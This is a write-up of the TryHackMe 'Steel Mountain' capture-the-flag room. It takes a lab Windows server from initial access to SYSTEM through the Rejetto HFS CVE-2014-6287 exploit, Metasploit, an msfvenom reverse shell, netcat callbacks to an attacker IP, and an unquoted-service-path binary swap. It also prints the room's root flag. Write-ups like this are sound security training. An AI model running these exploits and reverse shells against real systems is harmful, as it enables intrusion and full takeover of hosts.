# Steelmoutain [THM](https://tryhackme.com/room/steelmountain)

Let's see what this box has

```bash
$ nmap -sC -A -T4 -Pn 10.10.81.42

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 14:47 GMT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.81.42
Host is up (0.026s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION                                 
80/tcp    open  http               Microsoft IIS httpd 8.5                 
| http-methods:                                                            
|_  Potentially risky methods: TRACE                                       
|_http-server-header: Microsoft-IIS/8.5                                    
|_http-title: Site doesn't have a title (text/html).                       
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2020-10-11T19:04:29
|_Not valid after:  2021-04-12T19:04:29
|_ssl-date: 2020-12-29T14:48:44+00:00; -13s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -12s, deviation: 0s, median: -12s
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:c7:2c:a5:bd:b1 (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-29T14:48:39
|_  start_date: 2020-12-29T14:42:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.91 seconds

```

Let's start from the port 8080 and port 80


### Who is the employee of the month?

```bash
 curl http://10.10.81.42:80 steel
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

$ curl http://10.10.81.42:80 --output steel  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--   100   772  100   772    0     0  15137      0 --:--:-- --:--:-- --:--:-- 15137


$ la
total 4
12584008 -rw-r--r-- 1 clobee 772 Dec 29 14:59 steel

$ cat steel 
��<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```

Is Ben harper a potential user?


```bash
$ curl 10.10.81.42:8080
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN">
<html>
<head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <title>HFS /</title>
        <link rel="stylesheet" href="/?mode=section&id=style.css" type="text/css">
        <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.js"></script>
    <script> if (typeof jQuery == "undefined") document.write('<script type="text/javascript" src="/?mode=jquery"></'+'script>'); </script>
        <link rel="shortcut icon" href="/favicon.ico">                     
        <style class='trash-me'>                                           
        .onlyscript, button[onclick] { display:none; }                     
        </style>                                                           
    <script>                                                               
    // this object will store some %symbols% in the javascript space, so that libs can read them
    HFS = { folder:'/', number:0, paged:1 }; 
    </script>
        <script type="text/javascript" src="/?mode=section&id=lib.js"></script>
</head>
<body>
<!-- -->
<div id='panel'>
        <fieldset id='msgs'>
                <legend><img src="/~img10"> Messages</legend>
                <ul style='padding-left:2em'>
                </ul>
        </fieldset>

        <fieldset id='login'>
                <legend><img src="/~img27"> User</legend>
                <center>
                <a href="~login">Login</a>
                </center>
        </fieldset>                                       

        <fieldset id='folder'>
                <legend><img src="/~img8"> Folder</legend>

       <div style='float:right; position:relative; top:-1em; font-weight:bold;'>

                </div>

                <div id='breadcrumbs'>

                <a href="/"  /> <img src="/~img1"> Home</a>
       </div>
        
                <div id='folder-stats'>0 folders, 0 files, 0 bytes
                </div>


        </fieldset>

        <fieldset id='search'>
                <legend><img src="/~img3"> Search</legend>
                <form style='text-align:center'>
                        <input name='search' size='15' value="">
                        <input type='submit' value="go">
                </form>
                <div style='margin-top:0.5em;' class='hidden popup'>
                        <fieldset>
                                <legend>Where to search</legend>
                                        <input type='radio' name='where' value='fromhere' checked='true' />  this folder and sub-folders
                                        <br><input type='radio' name='where' value='here' />  this folder only
                                        <br><input type='radio' name='where' value='anywhere' />  entire server
                        </fieldset>
                </div>
        </fieldset>

        <fieldset id='select' class='onlyscript'>
                <legend><img src="/~img15"> Select</legend>
                <center>
        <button onclick="
            var x = $('#files .selector');
            if (x.size() > x.filter(':checked').size())
                x.attr('checked', true).closest('tr').addClass('selected');
                        else
                x.attr('checked', false).closest('tr').removeClass('selected');
                        selectedChanged();
                        ">All</button>
        <button onclick="
            $('#files .selector').attr('checked', function(i,v){ return !v }).closest('tr').toggleClass('selected');
                        selectedChanged();
            ">Invert</button>
        <button onclick='selectionMask.call(this)'>Mask</button>
                <p style='display:none; margin-top:1em;'><span id='selected-number'>0</span> items selected</p>
                </center>
        </fieldset>

    

        <fieldset id='actions'>
                <legend><img src="/~img18"> Actions</legend>
                <center>




                <button id='archiveBtn' onclick='if (confirm("Are you sure?")) submit({}, "/?mode=archive&recursive")'>Archive</button>
                <a href="/?tpl=list&folders-filter=\&recursive">Get list</a>
                </center>
        </fieldset>

        <fieldset id='serverinfo'>
                <legend><img src="/~img0"> Server information</legend>
                <a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
                <br />Server time: 12/29/2020 6:52:34 AM
                <br />Server uptime: 00:09:38
        </fieldset>


</div>

<div id='files_outer'>
        <div style='height:1.6em;'></div>  
         <div style='font-size:200%; padding:1em;'>No files in this folder</div> 
</div>

</body>
</html>
<!-- Build-time: 0.000 -->
```

### Scan the machine with nmap. What is the other port running a web server on?

```bash
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
```
### Take a look at the other web server. What file server is running?

`<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>`


### What is the CVE number to exploit this file server?

```bash
$ searchsploit rejetto 2.3.x
----------------------------------------- ---------------------------------
 Exploit Title                           |  Path
----------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) 2.3.x - R | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - R | windows/remote/39161.py
----------------------------------------- ---------------------------------
Shellcodes: No Results
```
```bash
$ searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /home/clobee/tmp/steelmoutain/39161.py

$ head -12 39161.py 
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
```

### Use Metasploit to get an initial shell. What is the user flag?

```
msf6 > search CVE-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.15     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.81.42
RHOSTS => 10.10.81.42

msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080

msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST [ATTACKER_IP]
LHOST => [ATTACKER_IP]

msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST [ATTACKER_IP]
SRVHOST => [ATTACKER_IP]

msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 4445
SRVPORT => 4445
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on [ATTACKER_IP]:4444 
[*] Using URL: http://[ATTACKER_IP]:4445/K86g3pJpB51PJQ
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /K86g3pJpB51PJQ
[*] Sending stage (175174 bytes) to 10.10.81.42
[*] Meterpreter session 1 opened ([ATTACKER_IP]:4444 -> 10.10.81.42:49248) at 2020-12-29 15:25:20 +0000
[!] Tried to delete %TEMP%\DYakY.vbs, unknown result
[*] Server stopped.

meterpreter >
```

```bash
meterpreter > search -f user.txt
Found 1 result...
    c:\Users\bill\Desktop\user.txt (70 bytes)
```

```bash
meterpreter > cat C:/Users/bill/Desktop/user.txt
XXXXXXXXXXXXXXXXXXXXXXXXX
```

## Privilege Escalation

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

--2020-12-29 16:12:29--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.60.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.60.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: ‘PowerUp.ps1’

PowerUp.ps1                 100%[===========================================>] 586.50K  --.-KB/s    in 0.06s   

2020-12-29 16:12:30 (9.10 MB/s) - ‘PowerUp.ps1’ saved [600580/600580]
```

```bash
meterpreter > lls
Listing Local: /home/clobee/tmp/steelmoutain
============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100644/rw-r--r--  574      fil   2020-12-29 15:10:18 +0000  30850.txt
100644/rw-r--r--  1703     fil   2020-12-29 15:12:18 +0000  34852.txt
100755/rwxr-xr-x  2512     fil   2020-12-29 15:14:26 +0000  39161.py
100644/rw-r--r--  1962666  fil   2020-12-29 15:52:37 +0000  PowerUp.ps1
100644/rw-r--r--  772      fil   2020-12-29 14:59:32 +0000  steel
```

```bash
meterpreter > upload PowerUp.ps1
[*] uploading  : /home/clobee/tmp/steelmoutain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 1.87 MiB of 1.87 MiB (100.0%): /home/clobee/tmp/steelmoutain/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/clobee/tmp/steelmoutain/PowerUp.ps1 -> PowerUp.ps1

meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft
================================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2019-09-27 13:21:09 +0100  Credentials
40777/rwxrwxrwx   0        dir   2019-09-27 07:29:04 +0100  Crypto
40777/rwxrwxrwx   0        dir   2019-09-27 07:29:03 +0100  Internet Explorer
40777/rwxrwxrwx   0        dir   2019-09-27 13:20:33 +0100  MMC
40777/rwxrwxrwx   0        dir   2020-12-29 15:21:20 +0000  Network
100666/rw-rw-rw-  1962666  fil   2020-12-29 15:54:38 +0000  PowerUp.ps1
40777/rwxrwxrwx   0        dir   2019-09-27 07:29:04 +0100  Protect
40777/rwxrwxrwx   0        dir   2019-09-27 12:07:06 +0100  SystemCertificates
40777/rwxrwxrwx   4096     dir   2019-09-27 07:29:03 +0100  Windows
```

```bash
meterpreter > upload PowerUp.ps1
[*] uploading  : /home/clobee/tmp/steelmoutain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/clobee/tmp/steelmoutain/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/clobee/tmp/steelmoutain/PowerUp.ps1 -> PowerUp.ps1

meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   4096    dir   2020-12-29 15:21:19 +0000  %TEMP%
100666/rw-rw-rw-  600580  fil   2020-12-29 16:10:34 +0000  PowerUp.ps1
100666/rw-rw-rw-  174     fil   2019-09-27 12:07:07 +0100  desktop.ini
100777/rwxrwxrwx  760320  fil   2019-09-27 10:24:35 +0100  hfs.exe

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

...
```

### Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

```bash
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>

CanRestart     : True

Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

### Use msfvenom to generate a reverse shell as an Windows executable.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4446 -e x86/shikata_ga_nai -f exe -o ASCService.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe
```

### What is the root flag?

```bash
meterpreter > upload ASCService.exe
[*] uploading  : /home/clobee/tmp/steelmoutain/ASCService.exe -> ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/clobee/tmp/steelmoutain/ASCService.exe -> ASCService.exe
[*] uploaded   : /home/clobee/tmp/steelmoutain/ASCService.exe -> ASCService.exe

meterpreter > ls
Listing: c:\Users\bill\Desktop
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   4096    dir   2020-12-29 15:21:19 +0000  %TEMP%
100777/rwxrwxrwx  73802   fil   2020-12-29 16:28:50 +0000  ASCService.exe
100666/rw-rw-rw-  600580  fil   2020-12-29 16:10:34 +0000  PowerUp.ps1
100666/rw-rw-rw-  174     fil   2019-09-27 12:07:07 +0100  desktop.ini
100777/rwxrwxrwx  760320  fil   2019-09-27 10:24:35 +0100  hfs.exe
```
Let's replace the legitimate service with out malicious file

```bash
meterpreter > shell
Process 500 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\Desktop>copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Overwrite \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.
```
Let's start the reverse shell in the attack machine

```bash
nc -nvlp 4446
listening on [any] 4446 ...
```

```bash 
meterpreter > shell
Process 500 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\Desktop>sc start AdvancedSystemCareService9
```

... We are in ...


```bash
nc -nvlp 4446
listening on [any] 4446 ...
connect to [[ATTACKER_IP]] from (UNKNOWN) [10.10.81.42] 49366
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>systeminfo
systeminfo

Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
...
```

### What is the root flag?

```bash
C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
more C:\Users\Administrator\Desktop\root.txt
9af5f314f57607c00fd09803a587db80

```

## Access and Escalation Without Metasploit 

```bash
searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: 39161.py
```
We need to change the ip_addr

```bash
$ cat 39161.py | grep ip_addr
        ip_addr = "192.168.44.128" #local IP address
        vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
        vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
```
Let's start a netcat on our attack box to receive the reverse shell

```bash
$ nc -nvlp 4444
listening on [any] 4444 ...
```
```bash
$ ls nc.exe 
19660885 -rw-r--r-- 1 clobee 2332672 Dec  2 00:43 nc.exe

$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Running the script 
```bash
$ python 39161.py 10.10.81.42 8080
```

Should upload the `nc.exe` on the victim machine

```bash
$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.81.42 - - [29/Dec/2020 17:28:38] "GET /nc.exe HTTP/1.1" 200 -
```

Running the script again, give us an access to the victim server

```bash
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [[ATTACKER_IP]] from (UNKNOWN) [10.10.81.42] 49429
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

Let's pull winPEAS to the system using powershell -c

```bash
C:\Users\bill\Desktop>powershell -c wget "http://[ATTACKER_IP]:80/winPEAS.exe" -outfile "winPEAS.exe"
powershell -c wget "http://[ATTACKER_IP]:80/winPEAS.exe" -outfile "winPEAS.exe"


C:\Users\bill\Desktop>powershell -c "Invoke-WebRequest -Uri 'http://[ATTACKER_IP]:80/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"
powershell -c "Invoke-WebRequest -Uri 'http://[ATTACKER_IP]:80/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"
```

```bash
$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.81.42 - - [29/Dec/2020 17:39:45] "GET /winPEAS.exe HTTP/1.1" 200 -
```
At this point we can exploit the machine running winPEAS `winPEAS.exe` and using the information this script reports.

### What powershell -c command could we run to manually find out the service name? 

```bash
C:\Users\bill\Desktop>powershell -c Get-Service
```